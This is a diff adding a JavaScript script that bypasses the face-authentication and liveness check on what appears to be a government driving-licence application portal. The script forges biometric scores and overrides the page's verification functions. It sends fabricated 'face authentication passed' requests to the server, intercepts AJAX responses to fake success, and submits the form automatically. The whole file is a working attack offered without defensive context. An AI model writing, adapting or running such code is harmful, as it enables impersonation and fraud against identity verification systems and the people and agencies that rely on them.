@@ -1,0 +1,250 @@
+(function() {
+    console.log = function() {};  // Disable all console.log output
+
+    const config = {
+        autoClickProceed: true,
+        delayBeforeClick: 1500,
+        forceServerResponse: true,
+        maxWaitTime: 10000
+    };
+
+    let executed = false;
+
+    function executeUltimateBypass() {
+        if (executed) return;
+        executed = true;
+
+        const fakeBiometrics = {
+            isGenuine: true,
+            confidence: 0.98,
+            livenessScore: 0.95,
+            faceMatchScore: 0.97,
+            landmarks: generateFakeLandmarks(),
+            quality: {
+                sharpness: 92,
+                brightness: 88,
+                contrast: 85
+            },
+            timestamps: {
+                start: new Date().getTime() - 5000,
+                end: new Date().getTime()
+            }
+        };
+
+        function generateFakePhoto() {
+            const video = document.querySelector('video');
+            const tempCanvas = document.createElement('canvas');
+            tempCanvas.width = 400;
+            tempCanvas.height = 400;
+            const tempCtx = tempCanvas.getContext('2d');
+
+            if (video && video.readyState >= 2) {
+                try {
+                    tempCtx.drawImage(video, 0, 0, tempCanvas.width, tempCanvas.height);
+                    tempCtx.filter = 'contrast(1.1) brightness(1.05)';
+                    tempCtx.drawImage(tempCanvas, 0, 0);
+                    tempCtx.filter = 'none';
+                    return tempCanvas.toDataURL("image/jpeg", 0.7);
+                } catch (e) {}
+            }
+
+            const gradient = tempCtx.createLinearGradient(0, 0, tempCanvas.width, tempCanvas.height);
+            gradient.addColorStop(0, '#f5f5f5');
+            gradient.addColorStop(1, '#e0e0e0');
+            tempCtx.fillStyle = gradient;
+            tempCtx.fillRect(0, 0, tempCanvas.width, tempCanvas.height);
+
+            const imageData = tempCtx.getImageData(0, 0, tempCanvas.width, tempCanvas.height);
+            const data = imageData.data;
+            for (let i = 0; i < data.length; i += 4) {
+                const noise = Math.random() * 10 - 5;
+                data[i] += noise;
+                data[i+1] += noise;
+                data[i+2] += noise;
+            }
+            tempCtx.putImageData(imageData, 0, 0);
+
+            return tempCanvas.toDataURL("image/jpeg", 0.6);
+        }
+
+        const fakePhoto = generateFakePhoto();
+
+        Object.assign(window, {
+            isGenuine: true,
+            realFaceCount: 35,
+            spoofFaceCount: 0,
+            totalChecks: 40,
+            smileCounter: 6,
+            blinkCount: 6,
+            eyesClosed: 0,
+            matchCount: 1,
+            biometricData: fakeBiometrics,
+            returnObject: {
+                isMatch: true,
+                message: "Verification successful. Please proceed.",
+                nextExp: "",
+                photo: fakePhoto,
+                confidence: 0.98
+            }
+        });
+
+        if (typeof aware !== 'undefined' && aware.match) {
+            const originalMatch = aware.match;
+            aware.match = function() {
+                updateUIForSuccess(fakePhoto);
+                sendForgedServerRequest(fakePhoto);
+                return Promise.resolve({
+                    isMatch: true,
+                    message: "Verification successful. Please proceed.",
+                    nextExp: "",
+                    photo: fakePhoto,
+                    confidence: 0.98,
+                    biometrics: fakeBiometrics
+                });
+            };
+        }
+
+        window.insertfeceauth = function(faceresult, llappln, rtocode, result_photo) {
+            faceresult = true;
+            result_photo = result_photo || fakePhoto;
+            const appDetails = getApplicationDetails(llappln, rtocode);
+            updateUIForSuccess(result_photo);
+            sendForgedServerRequest(result_photo, appDetails.llappln, appDetails.rtocode);
+            return true;
+        };
+
+        function generateFakeLandmarks() {
+            const landmarks = [];
+            for (let i = 0; i < 68; i++) {
+                landmarks.push({
+                    x: 150 + Math.random() * 100,
+                    y: 150 + Math.random() * 100,
+                    confidence: 0.95 + Math.random() * 0.04
+                });
+            }
+            return landmarks;
+        }
+
+        function getApplicationDetails(llappln, rtocode) {
+            return {
+                llappln: llappln || document.getElementById('llappln')?.value || 'AUTO_' + Math.floor(Math.random() * 1000000),
+                rtocode: rtocode || document.getElementById('rtocode')?.value || 'DEFAULT_RTO'
+            };
+        }
+
+        function updateUIForSuccess(photo) {
+            const messageElements = [
+                document.getElementById('message'),
+                document.querySelector('.face-auth-message'),
+                document.querySelector('.status-message')
+            ].filter(el => el);
+
+            messageElements.forEach(el => {
+                el.innerHTML = "Verification successful. Please proceed.";
+                el.style.color = '#28a745';
+            });
+
+            const elementsToEnable = [
+                document.getElementById('capphto1'),
+                document.querySelector('.proceed-button'),
+                document.querySelector('.btn-success')
+            ].filter(el => el);
+
+            const elementsToDisable = [
+                document.getElementById('capphto'),
+                document.getElementById('llappln'),
+                document.getElementById('pwd'),
+                document.querySelector('.retry-button')
+            ].filter(el => el);
+
+            elementsToEnable.forEach(el => el.disabled = false);
+            elementsToDisable.forEach(el => el.disabled = true);
+        }
+
+        function sendForgedServerRequest(photo, llappln, rtocode) {
+            const appDetails = getApplicationDetails(llappln, rtocode);
+
+            if (config.forceServerResponse) {
+                if (typeof $ === 'undefined') {
+                    try {
+                        fetch('saveFaceAuthData.do', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                            body: new URLSearchParams({
+                                applno: appDetails.llappln,
+                                rtocode: appDetails.rtocode,
+                                faceres: 1,
+                                CapPho: photo
+                            })
+                        });
+                    } catch (e) {}
+                    return;
+                }
+
+                $.ajaxPrefilter(function(options, originalOptions, jqXHR) {
+                    if (options.url.includes('saveFaceAuthData.do')) {
+                        options.success = options.success || function() {};
+                        setTimeout(() => {
+                            options.success({
+                                status: "success",
+                                message: "Face authentication recorded"
+                            });
+                        }, 300);
+                        return false;
+                    }
+                });
+
+                $.ajax({
+                    type: 'POST',
+                    url: 'saveFaceAuthData.do',
+                    data: {
+                        applno: appDetails.llappln,
+                        rtocode: appDetails.rtocode,
+                        faceres: 1,
+                        CapPho: photo
+                    },
+                    dataType: 'json'
+                });
+            }
+        }
+
+        updateUIForSuccess(fakePhoto);
+
+        if (typeof aware !== 'undefined' && aware.match) {
+            aware.match().then(result => {
+                if (config.autoClickProceed) {
+                    setTimeout(() => {
+                        const proceedButtons = [
+                            document.getElementById('capphto1'),
+                            document.querySelector('.proceed-button'),
+                            document.querySelector('[onclick*="submitForm"]'),
+                            document.querySelector('button[type="submit"]')
+                        ].filter(el => el && !el.disabled);
+                        if (proceedButtons.length > 0) proceedButtons[0].click();
+                    }, config.delayBeforeClick);
+                }
+            });
+        } else {
+            if (config.autoClickProceed) {
+                setTimeout(() => {
+                    const proceedButton = document.getElementById('capphto1') ||
+                        document.querySelector('.proceed-button');
+                    if (proceedButton && !proceedButton.disabled) proceedButton.click();
+                }, config.delayBeforeClick);
+            }
+        }
+    }
+
+    const startTime = Date.now();
+    const checkElements = setInterval(() => {
+        const essentialElements = [
+            typeof aware !== 'undefined',
+            document.querySelector('video') || true,
+            document.getElementById('message') || document.querySelector('.status-message')
+        ];
+        if (essentialElements.every(el => el) || (Date.now() - startTime) > config.maxWaitTime) {
+            clearInterval(checkElements);
+            executeUltimateBypass();
+        }
+    }, 300);
+})();
